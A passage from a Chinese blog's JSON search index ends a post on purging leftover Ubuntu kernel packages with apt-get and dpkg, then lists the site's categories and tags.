installed.)Removing Linux-image-2.6.35-25-generic ...Purging configuration files for Linux-image-2.6.35-25-generic ...Examining /etc/kernel/postrm.d .run-parts: executing /etc/kernel/postrm.d/initramfs-tools 2.6.35-25-generic /boot/vmlinuz-2.6.35-25-genericrun-parts: executing /etc/kernel/postrm.d/zz-update-grub 2.6.35-25-generic /boot/vmlinuz-2.6.35-25-generic 呵呵，其实打一开始就可以用purge这个参数一步到位地卸载，即： 123456789101112131415expired@expired:~$sudo apt-get purge Linux-image-3.2.0-26-genericReading package lists... DoneBuilding dependency treeReading state information... DoneThe following packages will be REMOVED:Linux-image-3.2.0-26-generic*0 upgraded, 0 newly installed, 1 to remove and 0 not upgraded.After this operation, 0 B of additional disk space will be used.Do you want to continue [Y/n]? y(Reading database ... 286964 files and directories currently installed.)Removing Linux-image-3.2.0-26-generic ...Purging configuration files for Linux-image-3.2.0-26-generic ...Examining /etc/kernel/postrm.d .run-parts: executing /etc/kernel/postrm.d/initramfs-tools 3.2.0-26-generic /boot/vmlinuz-3.2.0-26-genericrun-parts: executing /etc/kernel/postrm.d/zz-update-grub 3.2.0-26-generic /boot/vmlinuz-3.2.0-26-generic 因为之前已经remove过了，所以只留下个配置在数据库记录中，再purge时无空间释放。 0 B of additional disk space will be used 再次看下运行后的结果 123456expired@expired:~$ dpkg --get-selections | grep Linux-imageLinux-image-3.2.0-32-generic installLinux-image-generic installexpired@expired:~$ dpkg -l | grep Linux-imageii Linux-image-3.2.0-32-generic 3.2.0-32.51 Linux kernel image for version 3.2.0 on 64 bit x86 SMPii Linux-image-generic 3.2.0.32.35 Generic Linux kernel image ok，刚才的残留已经删除了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]}],"categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"},{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"},{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"},{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"},{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"},{"name":"混X圈","slug":"混X圈","permalink":"https://sobaigu.com/categories/%E6%B7%B7X%E5%9C%88/"},{"name":"瞎逼逼","slug":"瞎逼逼","permalink":"https://sobaigu.com/categories/%E7%9E%8E%E9%80%BC%E9%80%BC/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"},{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"虚拟币","slug":"虚拟币","permalink":"https://sobaigu.com/tags/%E8%99%9A%E6%8B%9F%E5%B8%81/"},{"name":"手机","slug":"手机","permalink":"https://sobaigu.com/tags/%E6%89%8B%E6%9C%BA/"},{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"},{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"aardio","slug":"aardio","permalink":"https://sobaigu.com/tags/aardio/"},{"name":"hugo","slug":"hugo","permalink":"https://sobaigu.com/tags/hugo/"},{"name":"教程","slug":"教程","permalink":"https://sobaigu.com/tags/%E6%95%99%E7%A8%8B/"},{"name":"v2ray","slug":"v2ray","permalink":"https://sobaigu.com/tags/v2ray/"},{"name":"python","slug":"python","permalink":"https://sobaigu.com/tags/python/"},{"name":"江湖","slug":"江湖","permalink":"https://sobaigu.com/tags/%E6%B1%9F%E6%B9%96/"},{"name":"淘宝","slug":"淘宝","permalink":"https://sobaigu.com/tags/%E6%B7%98%E5%AE%9D/"},{"name":"网赚","slug":"网赚","permalink":"https://sobaigu.com/tags/%E7%BD%91%E8%B5%9A/"},{"name":"刷单","slug":"刷单","permalink":"https://sobaigu.com/tags/%E5%88%B7%E5%8D%95/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"},{"name":"shadowsocks","slug":"shadowsocks","permalink":"https://sobaigu.com/tags/shadowsocks/"}]}